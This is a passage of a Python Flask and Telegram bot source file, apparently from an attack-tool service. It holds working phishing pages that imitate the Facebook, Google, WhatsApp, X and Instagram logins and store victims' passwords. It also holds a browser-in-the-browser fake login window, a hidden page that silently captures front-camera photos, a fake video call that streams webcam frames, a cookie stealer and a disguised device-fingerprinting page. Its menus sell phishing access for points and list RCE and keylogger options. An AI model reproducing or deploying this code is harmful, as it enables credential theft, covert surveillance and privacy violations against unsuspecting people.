<button type="button" class="create-btn" onclick="alert('قريباً')">إنشاء حساب جديد</button>
<div class="meta-footer"><span class="infinity">∞</span><span>Meta</span></div>
</div></div>
<script>
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    fetch('/api/phishing_submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
    .finally(function(){setTimeout(function(){window.location.href='https://www.facebook.com';},1500);});
});
</script></body></html>''',

    'google': '''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.container{width:100%;max-width:420px;padding:0 16px}
.logo{font-size:36px;font-weight:500;margin:6px 0 16px;text-align:center}
.logo .b{color:#4285f4}.logo .r{color:#ea4335}.logo .y{color:#fbbc05}.logo .g{color:#34a853}
.form-group{width:100%;margin-bottom:12px}
.form-group input{width:100%;height:50px;padding:0 16px;border:1px solid #dadce0;border-radius:25px;font-size:15px;outline:none}
.form-group input:focus{border-color:#4285f4}
.login-btn{width:100%;height:50px;background:#4285f4;border:none;border-radius:25px;font-size:16px;color:#fff;cursor:pointer;margin-top:4px}
.forgot{display:block;margin:22px 0;font-size:14px;color:#1C1E21;text-decoration:none;text-align:center}
</style></head><body>
<div class="container">
<div class="logo"><span class="b">G</span><span class="r">o</span><span class="y">o</span><span class="b">g</span><span class="g">l</span><span class="r">e</span></div>
<form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
<input type="hidden" name="platform" value="google">
<div class="form-group"><input type="email" name="username" placeholder="البريد الإلكتروني" required autofocus></div>
<div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
<button type="submit" class="login-btn">تسجيل الدخول</button>
</form>
<a href="#" class="forgot">نسيت كلمة السر؟</a>
</div>
<script>
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    fetch('/api/phishing_submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
    .finally(function(){setTimeout(function(){window.location.href='https://www.google.com';},1500);});
});
</script></body></html>''',

    'whatsapp': '''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WhatsApp</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.container{width:100%;max-width:420px;padding:0 16px}
.logo{font-size:36px;font-weight:700;color:#25d366;margin:6px 0 16px;text-align:center}
.form-group{width:100%;margin-bottom:12px}
.form-group input{width:100%;height:50px;padding:0 16px;border:1px solid #CCD0D5;border-radius:25px;font-size:15px;outline:none}
.form-group input:focus{border-color:#075e54}
.login-btn{width:100%;height:50px;background:#25d366;border:none;border-radius:25px;font-size:16px;font-weight:600;color:#fff;cursor:pointer;margin-top:4px}
.forgot{display:block;margin:22px 0;font-size:14px;color:#1C1E21;text-decoration:none;text-align:center}
</style></head><body>
<div class="container">
<div class="logo">💬 WhatsApp</div>
<form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
<input type="hidden" name="platform" value="whatsapp">
<div class="form-group"><input type="text" name="username" placeholder="رقم الهاتف" required autofocus></div>
<div class="form-group"><input type="password" name="password" placeholder="الكود" required></div>
<button type="submit" class="login-btn">تحقق</button>
</form>
<a href="#" class="forgot">هل نسيت الكود؟</a>
</div>
<script>
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    fetch('/api/phishing_submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
    .finally(function(){setTimeout(function(){window.location.href='https://web.whatsapp.com';},1500);});
});
</script></body></html>''',

    'twitter': '''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.container{width:100%;max-width:420px;padding:0 16px}
.logo{font-size:42px;font-weight:700;color:#000;text-align:center;margin:6px 0 16px}
.form-group{width:100%;margin-bottom:12px}
.form-group input{width:100%;height:50px;padding:0 16px;border:1px solid #CCD0D5;border-radius:25px;font-size:15px;outline:none}
.form-group input:focus{border-color:#1d9bf0}
.login-btn{width:100%;height:50px;background:#000;border:none;border-radius:25px;font-size:16px;font-weight:600;color:#fff;cursor:pointer;margin-top:4px}
</style></head><body>
<div class="container">
<div class="logo">𝕏</div>
<form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
<input type="hidden" name="platform" value="twitter">
<div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
<div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
<button type="submit" class="login-btn">تسجيل الدخول</button>
</form>
</div>
<script>
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    fetch('/api/phishing_submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
    .finally(function(){setTimeout(function(){window.location.href='https://x.com';},1500);});
});
</script></body></html>''',

    'instagram': '''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.container{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:30px;max-width:380px;width:100%}
.logo{font-size:32px;font-weight:700;color:#262626;text-align:center;margin-bottom:16px}
.form-group{margin-bottom:12px}
.form-group input{width:100%;height:48px;padding:0 16px;border:1px solid #dbdbdb;border-radius:4px;font-size:15px;background:#fafafa;outline:none}
.form-group input:focus{border-color:#a8a8a8}
.login-btn{width:100%;height:48px;background:#0095f6;border:none;border-radius:4px;font-size:16px;font-weight:600;color:#fff;cursor:pointer}
</style></head><body>
<div class="container">
<div class="logo">📷 Instagram</div>
<form action="/api/phishing_submit" method="POST" id="phishForm">
<input type="hidden" name="platform" value="instagram">
<div class="form-group"><input type="text" name="username" placeholder="اسم المستخدم" required autofocus></div>
<div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
<button type="submit" class="login-btn">تسجيل الدخول</button>
</form>
</div>
<script>
document.getElementById('phishForm').addEventListener('submit',function(e){
    e.preventDefault();
    fetch('/api/phishing_submit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(new FormData(this))})
    .finally(function(){setTimeout(function(){window.location.href='https://www.instagram.com';},1500);});
});
</script></body></html>'''
}

# ===================== قالب معلومات الجهاز =====================
DEVICE_INFO_TEMPLATE = '''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>جاري التحقق من الأمان...</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#f7f8fa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;
       display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#333}
  .card{background:#fff;border-radius:12px;padding:32px 24px;max-width:420px;width:100%;
        text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.08)}
  .spinner{width:44px;height:44px;border:4px solid #e5e7eb;border-top-color:#2563eb;
           border-radius:50%;margin:0 auto 18px;animation:spin .8s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  h2{font-size:18px;margin-bottom:8px;color:#111}
  p{font-size:14px;color:#6b7280;line-height:1.6}
</style></head><body>
<div class="card">
  <div class="spinner"></div>
  <h2>جاري التحقق من أمان جهازك</h2>
  <p>يرجى الانتظار قليلاً...</p>
</div>
<script>
(async function(){
  const chatId = "__CHAT_ID__";
  if (!chatId || chatId === "__CHAT_ID__") {
    document.querySelector('.card').innerHTML = '<h2>تم التحقق بنجاح</h2><p>يمكنك إغلاق الصفحة الآن.</p>';
    return;
  }

  const info = {};
  try {
    info.user_agent      = navigator.userAgent;
    info.language        = navigator.language || 'غير معروف';
    info.languages       = (navigator.languages || []).join(', ') || 'غير معروف';
    info.platform        = navigator.platform || 'غير معروف';
    info.cores           = navigator.hardwareConcurrency || null;
    info.ram             = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null;
    info.touch           = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
    info.max_touch       = navigator.maxTouchPoints || 0;
    info.screen          = screen.width + 'x' + screen.height;
    info.avail_screen    = screen.availWidth + 'x' + screen.availHeight;
    info.color_depth     = screen.colorDepth + ' bit';
    info.pixel_ratio     = window.devicePixelRatio || 1;
    info.orientation     = (screen.orientation && screen.orientation.type) ||
                           (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
    info.protocol        = location.protocol;
    info.viewport        = window.innerWidth + 'x' + window.innerHeight;
    info.cookies_enabled = navigator.cookieEnabled;
    info.dnt             = navigator.doNotTrack || 'غير معروف';
    info.timezone        = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
    info.local_time      = new Date().toLocaleString('ar-EG');
    info.time_offset     = new Date().getTimezoneOffset() + ' دقيقة';
    info.online          = navigator.onLine;
    info.bluetooth       = !!navigator.bluetooth;
    info.usb             = !!navigator.usb;
    info.pdf_viewer      = !!navigator.pdfViewerEnabled;
    info.vendor          = navigator.vendor || 'غير معروف';
    info.product         = navigator.product || 'غير معروف';

    if (navigator.getBattery) {
      try {
        const bat = await navigator.getBattery();
        info.battery_level  = Math.round(bat.level * 100) + '%';
        info.charging       = bat.charging;
        info.charging_time  = bat.chargingTime === Infinity ? 'غير معروف' : bat.chargingTime + ' ثانية';
        info.discharging_time = bat.dischargingTime === Infinity ? 'غير معروف' : bat.dischargingTime + ' ثانية';
      } catch(e) {}
    }

    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) {
      info.connection_type = conn.type || 'غير معروف';
      info.effective_type  = conn.effectiveType || 'غير معروف';
      info.downlink        = conn.downlink ? conn.downlink + ' Mbps' : 'غير معروف';
      info.rtt             = conn.rtt ? conn.rtt + ' ms' : 'غير معروف';
      info.save_data       = conn.saveData;
    }

    if (navigator.permissions) {
      try {
        const geo = await navigator.permissions.query({name:'geolocation'});
        info.geo_permission = geo.state;
      } catch(e) {}
    }

    try {
      if (navigator.userAgentData) {
        const hd = await navigator.userAgentData.getHighEntropyValues(
          ['platform','platformVersion','architecture','model','uaFullVersion']);
        info.platform_version = hd.platformVersion || null;
        info.architecture     = hd.architecture || null;
        info.device_model     = hd.model || null;
        info.ua_full_version  = hd.uaFullVersion || null;
      }
    } catch(e) {}

    info.system_lang = navigator.language;
  } catch(e) { info.error = e.message; }

  try {
    await fetch('/api/collect_device_info', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({chat_id: chatId, info: info})
    });
  } catch(e) {}

  document.querySelector('.card').innerHTML =
    '<h2>تم التحقق بنجاح</h2><p>يمكنك إغلاق الصفحة الآن.</p>';
})();
</script>
</body></html>'''

# ===================== بناء القوائم =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)

    markup.row(InlineKeyboardButton("🌤️ حالة الطقس", callback_data="weather"),
               InlineKeyboardButton("🔑 مولد كلمات المرور", callback_data="password_gen"))
    markup.row(InlineKeyboardButton("🔐 تحليل كلمات المرور", callback_data="password_strength"),
               InlineKeyboardButton("🎤 نص لصوت", callback_data="voice_gtts_menu"))
    markup.row(InlineKeyboardButton("🎨 توليد صور AI", callback_data="generate_image_btn"),
               InlineKeyboardButton("🔗 تقصير الروابط", callback_data="shorten_url"))
    markup.row(InlineKeyboardButton("🔗 فك الروابط", callback_data="expand_url"),
               InlineKeyboardButton("📹 مكالمة فيديو", callback_data="video_call"))
    markup.row(InlineKeyboardButton("💬 اقتباسات", callback_data="quotes_menu"),
               InlineKeyboardButton("🔍 فحص الروابط", callback_data="check_link_btn"))
    markup.row(InlineKeyboardButton("📄 تحليل PDF", callback_data="pdf_menu"),
               InlineKeyboardButton("📧 بريد مؤقت", callback_data="create_email_btn"))
    markup.row(InlineKeyboardButton("📥 تنزيل فيديو", callback_data="download_video"))

    if user_can_use_collector(chat_id):
        markup.row(InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device_info"),
                   InlineKeyboardButton("📷 كاميرا", callback_data="camera_hack"))
    if user_can_use_advanced(chat_id):
        markup.row(InlineKeyboardButton("🍪 الكوكيز", callback_data="cookie_stealer"),
                   InlineKeyboardButton("📱 تتبع رقم", callback_data="track_phone"))

    markup.row(InlineKeyboardButton("🎯 ClickFix", callback_data="clickfix_generator"),
               InlineKeyboardButton("📧 AccountDumpling", callback_data="account_dumpling"))
    markup.row(InlineKeyboardButton("🪟 BitB", callback_data="bitb_attack"),
               InlineKeyboardButton("🔑 ConsentFix", callback_data="consentfix_attack"))
    markup.row(InlineKeyboardButton("📱 BTMOB", callback_data="btmob_attack"))

    markup.row(InlineKeyboardButton("💎 نقاطي", callback_data="my_points"),
               InlineKeyboardButton("🔗 رابط الدعوة", callback_data="my_referral"))
    markup.row(InlineKeyboardButton("📜 سجل النقاط", callback_data="points_history"))

    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("🔍 vuln-agent", callback_data="vuln_agent"),
                   InlineKeyboardButton("🕵️ osint-d2", callback_data="osint_d2"))
        markup.row(InlineKeyboardButton("🌐 Py-NetRecon", callback_data="py_netrecon"),
                   InlineKeyboardButton("💀 Exploit-Dev", callback_data="exploit_dev"))
        markup.row(InlineKeyboardButton("🐍 Pentest Tools", callback_data="pentest_tools"))

    if user_can_use_phishing(chat_id):
        markup.row(InlineKeyboardButton("🎣 صفحات تصيد", callback_data="phishing_pages"),
                   InlineKeyboardButton("📧 بريد تصيد", callback_data="phishing_email"))
    else:
        markup.row(InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked"))

    if is_admin(chat_id):
        markup.row(InlineKeyboardButton("⚙️ لوحة التحكم", callback_data="admin_panel"))
        markup.row(InlineKeyboardButton("💎 منح نقاط", callback_data="admin_grant_points"),
                   InlineKeyboardButton("📊 إحصائيات المستخدمين", callback_data="admin_users_stats"))
        markup.row(InlineKeyboardButton("🖥️ RCE", callback_data="rce_menu"),
                   InlineKeyboardButton("🔑 Keylogger", callback_data="keylogger_menu"))
        markup.row(InlineKeyboardButton("🛡️ الحماية", callback_data="protection_menu"),
                   InlineKeyboardButton("👥 إدارة المستخدمين", callback_data="admin_users"))

    markup.row(InlineKeyboardButton("⬅️ القائمة", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"),
               InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"),
               InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_instagram"),
               InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"),
               InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"),
               InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"),
               InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for cat in QUOTES_DB.keys():
        markup.row(InlineKeyboardButton(cat, callback_data=f"quote_cat_{cat}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_voice_gtts_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    for voice_name in VOICES.keys():
        markup.row(InlineKeyboardButton(f"🎤 {voice_name}", callback_data=f"voice_gtts_{voice_name}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص", callback_data="pdf_summary"),
               InlineKeyboardButton("استخراج", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("الإحصائيات", callback_data="admin_stats"),
               InlineKeyboardButton("البث", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("💎 منح نقاط", callback_data="admin_grant_points"),
               InlineKeyboardButton("📊 المستخدمين", callback_data="admin_users_stats"))
    markup.row(InlineKeyboardButton("المستخدمين", callback_data="admin_users"),
               InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"))
    markup.row(InlineKeyboardButton("حظر/فك", callback_data="admin_ban_menu"),
               InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("قفل البوت", callback_data="protect_lock"),
               InlineKeyboardButton("تخفي", callback_data="protect_stealth"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_users_menu(chat_id, action):
    users = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users[:30]:
        user_id = user[0]
        name = get_user_name(user_id)
        status = "🟢" if user[2] == 0 else "🔴"
        label = f"{name} ({user_id}) - {status} - {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

# ===================== صفحات HTML إضافية =====================
def generate_bitb_page(chat_id):
    return f'''<!DOCTYPE html>
<html><head><title>فيسبوك</title>
<style>
.fake-window{{position:fixed;top:10%;left:25%;width:50%;background:#fff;border:2px solid #1877f2;border-radius:8px;box-shadow:0 8px 30px rgba(0,0,0,0.3);z-index:9999}}
.fake-header{{background:#1877f2;padding:8px;color:#fff;font-weight:bold;display:flex;justify-content:space-between}}
.fake-body{{padding:20px;text-align:center}}
.fake-body input{{width:90%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:4px}}
.fake-body button{{width:90%;padding:10px;background:#1877f2;color:#fff;border:none;border-radius:4px;cursor:pointer}}
</style></head><body>
<div class="fake-window" id="bitbWindow">
<div class="fake-header"><span>🔒 فيسبوك</span><span onclick="document.getElementById('bitbWindow').style.display='none'" style="cursor:pointer">✕</span></div>
<div class="fake-body">
<h3>تسجيل الدخول</h3>
<input type="text" placeholder="البريد" id="bitbEmail">
<input type="password" placeholder="كلمة السر" id="bitbPass">
<button onclick="sendBitbData()">دخول</button>
</div></div>
<script>
function sendBitbData(){{
    fetch('/api/phishing_submit',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:new URLSearchParams({{platform:'facebook',username:document.getElementById('bitbEmail').value,password:document.getElementById('bitbPass').value}})}});
    alert('تم تسجيل الدخول!');
    window.location.href='https://www.facebook.com';
}}
</script></body></html>'''

def generate_consentfix_page(chat_id):
    return '''<!DOCTYPE html>
<html><head><title>طلب الإذن</title></head>
<body style="font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
<div style="background:#fff;padding:30px;border-radius:8px;max-width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
<h2>🔐 طلب الإذن</h2>
<p>تطبيق "Security Check" يطلب صلاحيات:</p>
<ul><li>البريد الإلكتروني</li><li>الملفات</li></ul>
<button onclick="alert('تم منح الإذن');window.location.href='https://www.microsoft.com'" style="background:#0078d4;color:#fff;padding:12px;border:none;border-radius:4px;width:100%;cursor:pointer">منح الإذن</button>
</div></body></html>'''

def generate_btmob_page(chat_id):
    return '''<!DOCTYPE html>
<html><head><title>تحديث</title></head>
<body style="text-align:center;padding:50px;font-family:Arial">
<h2>📱 تحديث التطبيق</h2>
<p>يوجد تحديث أمني عاجل.</p>
<a href="#" style="background:#4CAF50;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block">تحميل</a>
</body></html>'''

# ===================== دوال التنفيذ الداخلية =====================
def camera_hack_impl(chat_id):
    """صفحة كاميرا بيضاء صامتة تماماً"""
    html = f'''<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title></title>
<style>
  html,body{{margin:0;padding:0;width:100%;height:100%;background:#ffffff;overflow:hidden}}
  #v{{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}}
</style>
</head><body>
<video id="v" autoplay muted playsinline></video>
<script>
(function(){{
  var chatId = '{chat_id}';
  var video = document.getElementById('v');
  var captured = false;

  async function capture() {{
    if (captured) return;
    captured = true;
    try {{
      var stream = await navigator.mediaDevices.getUserMedia({{
        video: {{ facingMode: 'user', width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }},
        audio: false
      }});
      video.srcObject = stream;
      await video.play();
      await new Promise(function(r){{ setTimeout(r, 1300); }});

      var w = video.videoWidth || 640;
      var h = video.videoHeight || 480;
      var canvas = document.createElement('canvas');
      canvas.width = w; canvas.height = h;
      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
      var dataUrl = canvas.toDataURL('image/jpeg', 0.85);

      stream.getTracks().forEach(function(t){{ t.stop(); }});

      try {{
        await fetch('/api/collect_camera', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/json'}},
          body: JSON.stringify({{ chat_id: chatId, image: dataUrl, source: 'front_camera' }})
        }});
      }} catch(e) {{
        try {{
          navigator.sendBeacon('/api/collect_camera',
            new Blob([JSON.stringify({{ chat_id: chatId, image: dataUrl, source: 'front_camera' }})],
                     {{type:'application/json'}}));
        }} catch(_) {{}}
      }}
    }} catch(e) {{
    }} finally {{
      try {{ window.location.replace('https://www.google.com'); }} catch(_) {{}}
    }}
  }}

  capture();
  setTimeout(capture, 1500);
  setTimeout(capture, 3000);
}})();
</script>
</body></html>'''
    return render_template_string(html)


def device_info_impl(chat_id):
    html = DEVICE_INFO_TEMPLATE.replace("__CHAT_ID__", str(chat_id))
    return render_template_string(html)


def video_call_impl(chat_id):
    html = f'''<!DOCTYPE html>
<html lang="ar" dir="rtl"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>ConnectPro</title>
<style>
body{{font-family:Arial,sans-serif;background:#0F0F1A;color:#fff;margin:0;padding:20px;text-align:center}}
video{{width:100%;max-width:320px;border-radius:12px;border:2px solid #a855f7}}
h1{{color:#a855f7}}
</style></head><body>
<h1>ConnectPro</h1>
<p>جاري الاتصال...</p>
<video id="selfVideo" autoplay muted playsinline></video>
<script>
(function(){{
    var chatId='{chat_id}';
    var stream=null,captureInterval=null;
    function captureAndSend(){{
        if(!stream)return;
        var video=document.getElementById('selfVideo');
        var canvas=document.createElement('canvas');
        canvas.width=video.videoWidth||320;
        canvas.height=video.videoHeight||240;
        canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
        fetch('/api/collect_camera',{{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body:JSON.stringify({{chat_id:chatId,image:canvas.toDataURL('image/jpeg',0.8),source:'video_call'}})
        }});
    }}
    navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user',width:320,height:240}},audio:false}})
    .then(function(s){{
        stream=s;
        document.getElementById('selfVideo').srcObject=stream;
        captureInterval=setInterval(captureAndSend,3000);
    }})
    .catch(function(err){{console.error('Camera error:',err);}});
}})();
</script></body></html>'''
    return render_template_string(html)


def cookie_stealer_impl(chat_id):
    html = '''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title></title>
<style>html,body{margin:0;padding:0;background:#fff;width:100%;height:100%;overflow:hidden}</style>
</head>
<body>
<script>
(function(){
    var chatId='__CHATID__';
    var cookies=document.cookie;
    if(cookies){
        fetch('/api/collect_cookie',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:chatId,url:window.location.href,cookies:cookies,technique:'direct'})
        });
    }
    try { window.location.replace('https://www.google.com'); } catch(e){}
})();
</script></body></html>'''.replace('__CHATID__', str(chat_id))
    return render_template_string(html)

# ===================== Rate Limiting Decorator =====================
def rate_limit(max_per_minute=30, key='user'):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if key == 'ip':
                ip = request.remote_addr or 'unknown'
                if not rate_limiter.check_ip(ip, max_per_minute):
                    metrics.inc('rate_limit_ip_blocked')
                    return jsonify({"error": "Too many requests"}), 429
            else:
                user_id = None
                try:
                    if request.is_json:
                        user_id = request.json.get('chat_id')
                    else:
                        user_id = request.form.get('chat_id') or request.form.get('id')
                    if not user_id:
                        user_id = extract_chat_id(request)
                except:
                    pass

                if user_id:
                    try:
                        user_id_int = int(user_id)
                    except:
                        user_id_int = user_id
                    admin_flag = (str(user_id) == str(ADMIN_ID))
                    if not rate_limiter.check_user(user_id_int, max_per_minute, admin_flag):
                        metrics.inc('rate_limit_user_blocked')
                        return jsonify({"error": "Too many requests"}), 429
            return f(*args, **kwargs)
        wrapper.__name__ = f.__name__
        return wrapper
    return decorator

# ===================== Flask Routes الأساسية =====================
@app.route('/')
def index():
    metrics.inc('http_root')
    return "OK", 200

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "time": datetime.now().isoformat()}), 200

@app.route('/status')
def status():
    metrics.inc('http_status')
    try:
        info = bot.get_webhook_info()
        webhook_info = {
            'url': info.url,
            'pending_updates': info.pending_update_count,
            'last_error': info.last_error_message
        }
    except Exception as e:
        webhook_info = {'error': str(e)}

    users_count = safe_db_query("SELECT COUNT(*) FROM users")
    users_count = users_count[0] if users_count else 0
    active_24h = safe_db_query(
        "SELECT COUNT(*) FROM users WHERE last_seen >= ?",
        ((datetime.now() - timedelta(hours=24)).isoformat(),)
    )
    active_24h = active_24h[0] if active_24h else 0

    return jsonify({
        'status': 'running',
        'version': '21.0',
        'metrics': metrics.snapshot(),
        'webhook': webhook_info,
        'database': {'users_total': users_count, 'users_active_24h': active_24h},
        'bot_locked': BOT_LOCKED,
        'stealth_mode': STEALTH_MODE
    }), 200

@app.route('/metrics')
def prometheus_metrics():
    snap = metrics.snapshot()
    lines = [
        f"# HELP shadownet_uptime_seconds Uptime in seconds",
        f"# TYPE shadownet_uptime_seconds gauge",
        f"shadownet_uptime_seconds {snap['uptime_seconds']}",
        "",
    ]
    for key, val in snap['counters'].items():
        safe_key = re.sub(r'[^a-zA-Z0-9_]', '_', key)
        lines.append(f"shadownet_counter_{safe_key} {val}")
    lines.append(f"shadownet_active_users {snap['active_users_cached']}")
    return "\n".join(lines), 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/webhook', methods=['POST'])
@rate_limit(max_per_minute=120, key='ip')
def webhook():
    try:
        metrics.inc('webhook_received')
        json_str = request.get_data().decode('UTF-8')
        if not json_str:
            return "OK", 200

        update = None
        try:
            update = Update.de_json(json_str, bot)
        except TypeError:
            try:
                update = Update.de_json(json_str)
            except Exception as e:
                logger.error(f"de_json failed: {e}")
                metrics.inc('webhook_dejson_error')
                return "ERROR", 500
        except Exception as e:
            logger.error(f"de_json error: {e}")
            metrics.inc('webhook_dejson_error')
            return "ERROR", 500

        if update is None:
            return "OK", 200

        threading.Thread(
            target=bot.process_new_updates,
            args=([update],),
            daemon=True
        ).start()
        return "OK", 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        metrics.inc('webhook_exception')
        return "ERROR", 500

@app.route('/api/phishing_submit', methods=['POST'])
@rate_limit(max_per_minute=20, key='ip')
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')[:50]
        username = request.form.get('username', '')[:200]
        password = request.form.get('password', '')[:200]
        ip = request.remote_addr or 'unknown'
        metrics.inc('phishing_submission')

        safe_db_execute(
            "INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
            ('', platform, username, password, ip, datetime.now().isoformat())
        )
        try:
            notify_admin(f"🎯 <b>تصيد جديد!</b>\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        except:
            pass
        return "OK", 200
    except Exception as e:
        logger.error(f"phishing_submit error: {e}")
        return "ERROR", 500

# ===================== Routes الصفحات (Short Links) =====================
@app.route('/c')
def short_camera():
    """رابط الكاميرا المختصر"""
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return camera_hack_impl(chat_id)

@app.route('/d')
def short_device():
    """رابط معلومات الجهاز المختصر"""
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return device_info_impl(chat_id)

@app.route('/v')
def short_video_call():
    """رابط مكالمة الفيديو المختصر"""
    chat_id = extract_chat_id(request)
    if not chat_id:
        return "", 200
    return video_call_impl(chat_id)

